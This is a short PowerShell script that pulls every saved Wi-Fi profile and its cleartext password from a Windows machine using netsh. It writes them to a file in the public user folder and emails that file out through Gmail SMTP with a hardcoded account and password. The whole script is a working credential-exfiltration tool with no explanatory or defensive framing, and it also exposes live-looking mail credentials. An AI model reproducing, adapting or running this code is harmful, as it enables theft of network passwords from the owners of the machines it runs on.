#Make a list with all WiFi SSID's and passwords stored locally on Windows OS.
 
$output = netsh.exe wlan show profiles
$profileRows = $output | Select-String -Pattern 'All User Profile'
$profileNames = New-Object System.Collections.ArrayList
 
#for each profile name get the SSID and password
for($i = 0; $i -lt $profileRows.Count; $i++){
    $profileName = ($profileRows[$i] -split ":")[-1].Trim()
   
    $profileOutput = netsh.exe wlan show profiles name="$profileName" key=clear
   
    $SSIDSearchResult = $profileOutput| Select-String -Pattern 'SSID Name'
    $profileSSID = ($SSIDSearchResult -split ":")[-1].Trim() -replace '"'
 
    $passwordSearchResult = $profileOutput| Select-String -Pattern 'Key Content'
    if($passwordSearchResult){
        $profilePw = ($passwordSearchResult -split ":")[-1].Trim()
    } else {
        $profilePw = ''
    }
   
    $networkObject = New-Object -TypeName psobject -Property @{
        ProfileName = $profileName
        SSID = $profileSSID
        Password = $profilePw
    }
    $profileNames.Add($networkObject)
}
 
$profileNames | Sort-Object ProfileName | Select-Object ProfileName, SSID, Password > C:\users\public\ps03.txt
$smtpServer = "smtp.gmail.com"
$username = "cool.black.dragoney@gmail.com"
$password = "bdn386053"
$SMTPMessage = New-Object System.Net.Mail.MailMessage
$SMTPClient = New-Object Net.Mail.SmtpClient($smtpServer,587) 
$SMTPClient.EnableSsl = $true 
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($username, $password);
$SMTPMessage.From = "cool.black.dragoney@gmail.com"
$SMTPMessage.To.add("cool.black.dragoney@gmail.com")
$SMTPMessage.Subject = "TestSubject" 
$SMTPMessage.Body = "TestBody"
$SMTPMessage.Attachments.Add("C:\users\public\ps03.txt")
$SMTPClient.Send($SMTPMessage)
$SMTPMessage.Attachments.Dispose()
